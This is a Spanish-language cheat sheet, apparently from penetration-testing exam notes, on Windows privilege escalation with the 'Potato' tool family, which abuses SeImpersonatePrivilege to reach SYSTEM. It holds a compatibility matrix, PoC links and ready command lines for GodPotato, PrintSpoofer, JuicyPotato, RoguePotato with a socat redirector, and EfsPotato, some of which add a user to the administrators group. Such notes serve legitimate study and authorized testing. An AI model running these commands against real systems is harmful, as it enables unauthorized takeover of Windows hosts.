# Chuleta — Familia Potato (Windows privesc)

> Requisito común: el usuario comprometido tiene **`SeImpersonatePrivilege`** o
> **`SeAssignPrimaryTokenPrivilege`** (típico en cuentas de servicio: IIS `iis apppool\`, MSSQL,
> servicios). Ver `vault/indices/Tecnicas/seimpersonate.md` y `guia/04-privesc-windows.md`.
> Objetivo: de cuenta de servicio → `NT AUTHORITY\SYSTEM`.
>
> Referencias base: [Jorge Lajara — Potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) ·
> [HackTricks — RoguePotato/PrintSpoofer](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html) ·
> [HackTricks — JuicyPotato](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/juicypotato.html).

---

## 0. ¿Qué Potato me sirve en ESTA máquina? (`potato_check.exe`)

Antes de disparar a ciegas, corré el detector. Está en `~/examen/tools/win/potato_check64.exe`
(comprimido a un `.exe` estático, sin dependencias).

```cmd
:: En la víctima
.\potato_check64.exe
```

Ejemplo de salida:

```text
=== System Context ===
User             : iis apppool\defaultapppool
OS Build         : 17763 (Win10 1809 / Server 2019)
Integrity        : medium
SeImpersonate    : present [disabled]
SeAssignPrimary  : present [disabled]
DCOM             : enabled
Spooler          : running
WinRM            : running
EFS              : running

=== Potato Assessment ===
  HotPotato      : not vulnerable
  RottenPotato   : conditional
  JuicyPotato    : not vulnerable
  JuicyPotatoNG  : vulnerable
  SweetPotato    : vulnerable
  RoguePotato    : vulnerable
  PrintSpoofer   : vulnerable
  EfsPotato      : vulnerable
  GodPotato      : vulnerable
```

**Cómo leerlo:**

- `SeImpersonate`/`SeAssignPrimary` **absent** → **ningún** Potato aplica; buscá otro vector.
  (Si aparecen `disabled`, tu proceso puede habilitarlos al usarlos.)
- `Spooler: stopped` → **PrintSpoofer falla**.
- `DCOM: disabled` → Rotten/Juicy/Rogue con problemas.
- `EfsService: stopped` → EfsPotato puede no funcionar.
- El **OS Build** decide la tabla de compatibilidad (abajo).

Fuente y código: [Shinjio/potato_checker](https://github.com/Shinjio/potato_checker).

> **Detalle clave**: `SeImpersonatePrivilege` puede faltar si tu shell es un token restringido
> (Local Service / Network Service en algunos contextos). Recuperá los privilegios por defecto
> de la cuenta con **[FullPowers](https://github.com/itm4n/FullPowers)** y luego corré el Potato:
>
> ```cmd
> FullPowers.exe -c "cmd /c whoami /priv" -z
> ```

---

## 1. Blog / PoC por cada variante (lo que pediste)

| Variante | Blog / PoC de explotación | Windows objetivo |
| --- | --- | --- |
| **Hot Potato** | [FoxGlove Security](https://foxglovesecurity.com/2016/01/16/hot-potato/) | Win7–10, 2008/2012 (**parcheado**) |
| **Rotten Potato** | [FoxGlove Security](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) | ≤ Win10 1809 / 2016 |
| **Lonely Potato** | [Decoder](https://decoder.cloud/2017/12/23/the-lonely-potato/) | deprecado → Juicy |
| **Juicy Potato** | [ohpe.it](https://ohpe.it/juicy-potato/) · [lista de CLSIDs](http://ohpe.it/juicy-potato/CLSID/) | < Win10 1809 / 2016 |
| **JuicyPotatoNG** | [antonioCoco](https://github.com/antonioCoco/JuicyPotatoNG) | ≥ Win10 1809 / 2019 |
| **Rogue Potato** | [Decoder](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/) · [walkthrough 0xdf](https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html) | ≥ 1809 / 2019 (con redireccionador) |
| **PrintSpoofer** | [itm4n](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) | Win10 / 2016 / 2019 (Spooler) |
| **Sweet Potato** | [CCob/SweetPotato](https://github.com/CCob/SweetPotato) | amplio (auto) |
| **GodPotato** | [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato) | Server 2012–2022, Win8–11 |
| **SigmaPotato** | [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato) | fork moderno de GodPotato |
| **EfsPotato** | [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato) | MS-EFSR |
| **SharpEfsPotato** | [b4rtik/SharpEfsPotato](https://github.com/b4rtik/SharpEfsPotato) | MS-EFSR (.NET) |
| **DCOMPotato** | [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato) | DCOM |
| **RogueWinRM** | [antonioCoco/RogueWinRM](https://github.com/antonioCoco/RogueWinRM) | cuando el Spooler no está, pero WinRM sí |
| **RemotePotato0** | [antonioCoco/RemotePotato0](https://github.com/antonioCoco/RemotePotato0) | escalada/captura entre sesiones |
| **Generic Potato** | [micahvandeusen/GenericPotato](https://github.com/micahvandeusen/GenericPotato) | SSRF / escritura de archivos |
| **FullPowers** | [itm4n/FullPowers](https://github.com/itm4n/FullPowers) | recuperar privilegios del token restringido |

---

## 2. ELECCIÓN RÁPIDA (TL/DR)

```text
¿Tenés SeImpersonate / SeAssignPrimaryToken?
│
├─ Sin saber la versión → corré potato_check64.exe y seguí su Assessment
│
├─ El más amplio ─────────────────────────► GOD POTATO (o SigmaPotato)
├─ Spooler activo ─────────────────────────► PrintSpoofer / SweetPotato
├─ Build >= 1809 ──────────────────────────► RoguePotato / JuicyPotatoNG
├─ Build < 1809 ───────────────────────────► JuicyPotato (CLSID correcto)
├─ WinRM activo y Spooler no ──────────────► RogueWinRM
├─ Sin RPC saliente / BITS off / SSRF ─────► GenericPotato (HTTP/NamedPipe)
└─ EFSRPC disponible ──────────────────────► EfsPotato / SharpEfsPotato
```

---

## 3. Matriz de compatibilidad (build → variante)

| Variante | Condición (según `potato_check`) |
| --- | --- |
| **HotPotato** | build ≤ 7601 (Win7 SP1 / 2008 R2) — **parcheado** |
| **RottenPotato** | SeImpersonate + **DCOM** + build < 17763 |
| **JuicyPotato** | SeImpersonate + **DCOM** + build < 17763 |
| **JuicyPotatoNG** | SeImpersonate + **DCOM** + build ≥ 17763 |
| **SweetPotato** | SeImpersonate (auto-prueba métodos) |
| **RoguePotato** | SeImpersonate + DCOM (necesita OXID en TCP/135) |
| **PrintSpoofer** | SeImpersonate + **Spooler running** |
| **EfsPotato** | SeImpersonate + build ≥ 14393 |
| **GodPotato** | SeImpersonate + build ≥ 9200 (Win8+) |

Builds de referencia: `>=26100` Win11 24H2/2025 · `>=22000` Win11 · `>=20348` Server 2022 ·
`>=17763` Win10 1809/2019 · `>=14393` 2016 · `>=9600` 8.1/2012R2 · `>=9200` 8/2012 ·
`>=7601` 7 SP1/2008R2.

---

## 4. Uso de cada una

### GodPotato (empezá por acá)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net localgroup administrators <USER> /add"
```

### PrintSpoofer

```cmd
PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -c "cmd /c net localgroup administrators <USER> /add"
```

> Requiere el **Spooler** activo. Si no: `sc query spooler`. Falla en Server Core con spooler
> deshabilitado (caso real: máquina *Cereal*).

### SweetPotato (todo en uno)

```cmd
.\SweetPotato.exe
  -c, --clsid=VALUE     CLSID (default BITS 4991D34B-80A1-4291-83B6-3328366B9097)
  -m, --method=VALUE    Auto|User|Thread
  -p, --prog=VALUE      cmd.exe     -a, --args=VALUE
  -e, --exploit=VALUE   DCOM|WinRM|EfsRpc|PrintSpoofer (default PrintSpoofer)
  -l, --listenPort=VALUE
.\SweetPotato.exe -e DCOM -p cmd.exe -a "/c whoami"
```

### JuicyPotato

```cmd
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```

- `-l` puerto · `-p` programa · `-a` args · `-t *` (both) · `-c` CLSID
- **Necesita un CLSID válido para esa versión** → [lista por OS](http://ohpe.it/juicy-potato/CLSID/).
- Usá `-t` para elegir `CreateProcessWithToken` (`t`, requiere SeImpersonate) o
  `CreateProcessAsUser` (`u`, requiere SeAssignPrimaryToken).

### Rogue Potato

```bash
# En tu Kali: redirigir el 135 al puerto del fake OXID resolver de la víctima
socat tcp-listen:135,reuseaddr,fork tcp:<VICTIM_IP>:9999
```

```cmd
.\RoguePotato.exe -r <TU_IP> -e "cmd /c whoami" -l 9999
```

> Necesita un host controlado alcanzable en **TCP/135** desde la víctima. En builds viejas
> hacía falta `-f`.

### EfsPotato / SharpEfsPotato

```cmd
SharpEfsPotato.exe -p C:\Windows\system32\cmd.exe -a "/c whoami"
EfsPotato.exe "whoami"
```

> Abusa **MS-EFSR**. Si un pipe está bloqueado, probá otro: `lsarpc`, `efsrpc`, `samr`, `lsass`,
> `netlogon`. El error `0x6d3` en `RpcBindingSetAuthInfo` suele indicar un servicio RPC no
> soportado → cambiá de pipe/transporte.

### GenericPotato

```cmd
.\GenericPotato.exe -e HTTP      -p cmd.exe -a "/c whoami" -l 8888
.\GenericPotato.exe -e NamedPipe -p cmd.exe -a "/c whoami"
```

### RogueWinRM

Cuando el **Spooler no corre** pero **WinRM sí**, fuerza al servicio WinRM a autenticarse
contra un listener tuyo.

### FullPowers (cuando falta el privilegio)

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
```

---

## 5. Hilos históricos (por qué a veces fallan)

| Técnica | Qué explotaba | Estado |
| --- | --- | --- |
| **Hot Potato** | WPAD/NBNS spoof + relay SMB→SMB local | Parcheado (MS16-075/077) |
| **Rotten Potato** | CoGetInstanceFromIStorage + RPC 135 + AcceptSecurityContext | No funciona ≥ 1809 |
| **Juicy Potato** | Rotten + CLSIDs alternativos (BITS) | No funciona ≥ 1809 (sin redireccionador) |
| **Rogue Potato** | Redirección de OXID resolver a fake RPC | Funciona (con socat) |

> La lección: **no basta con "usar Potato"** — hay que elegir el método según el build y los
> servicios disponibles. `potato_check.exe` te lo dice. En `vault/indices/Tecnicas/potato.md` ves las
> máquinas del corpus donde cada uno se usó (o falló).
